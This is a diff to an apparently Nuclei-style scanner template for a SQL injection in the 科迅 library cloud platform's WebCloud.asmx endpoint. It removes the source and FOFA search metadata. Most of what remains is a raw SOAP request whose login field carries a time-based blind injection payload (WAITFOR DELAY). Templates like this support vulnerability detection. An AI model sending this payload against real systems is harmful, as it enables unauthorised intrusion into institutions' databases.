@@ -3,14 +3,8 @@ info:
   name: 科迅图书馆云平台 WebCloud.asmx SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zlg0li89q5spu2et
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zlg0li89q5spu2et
-    fofa: "title==\"\t欢迎使用 图书馆云平台\""
 http:
 - raw:
   - "POST /WebCloud.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"WebCloud/LibraryCloud\"\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <LibraryCloud xmlns=\"WebCloud\">\n      <str>{\"cmd\":\"login\",\"schoolloginname\":\"1';WAITFOR DELAY '0:0:5'--\",\"schoolpwd\":\"1\"}</str>\n      <files>base64Binary</files>\n    </LibraryCloud>\n  </soap:Body>\n</soap:Envelope>"
